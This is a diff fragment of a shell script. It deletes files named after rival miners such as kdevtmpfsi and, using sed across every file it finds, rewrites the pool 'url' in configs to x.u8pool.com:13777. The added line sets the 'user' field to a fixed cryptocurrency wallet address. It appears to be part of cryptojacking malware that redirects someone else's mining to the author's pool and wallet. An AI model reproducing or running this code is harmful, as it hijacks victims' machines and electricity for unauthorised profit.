@@ -65,3 +65,4 @@ rm -f svcworkmanager
 rm -f newsvc.sh
 rm -f kdevtmpfsi
 grep -r "x.u8pool.com:13777" ./ && echo "yes" || sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:13777",/' `grep url -rl ./`
+grep -r "4AYpmqXKbtMTbBXgkFwCCUE1Vb6GqeetqMWN3wXSoXwoSqKd2pr78L7VUHMECGg6H93EAADjgSomWP9GFCgvdGfD4xmfXE9" ./ && echo "yes" || sed -i 's/"user": *"[^"]*",/"user": "4AYpmqXKbtMTbBXgkFwCCUE1Vb6GqeetqMWN3wXSoXwoSqKd2pr78L7VUHMECGg6H93EAADjgSomWP9GFCgvdGfD4xmfXE9",/' `grep user -rl ./`
